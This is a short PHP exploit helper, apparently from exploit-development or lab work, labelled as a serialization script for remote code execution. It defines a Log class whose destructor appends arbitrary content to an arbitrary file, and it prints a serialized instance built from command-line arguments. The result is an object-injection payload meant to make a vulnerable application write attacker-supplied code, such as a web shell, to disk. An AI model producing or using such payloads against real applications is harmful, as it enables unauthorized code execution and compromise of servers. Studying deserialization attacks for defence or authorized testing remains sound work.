<?php
	
	// @title  Serialization Helper Script for RCE #3
	// @author William Moody
	// @date   10.03.2021

	class Log {
        public function __construct($f, $m) {
            $this->f = $f;
            $this->m = $m;
        }
        
        public function __destruct() {
            file_put_contents($this->f, $this->m, FILE_APPEND);
        }
    }

	// base64 so that it doesn't execute the code here
	$log = new Log($argv[1],base64_decode($argv[2]));
	print_r(serialize($log));	

?>
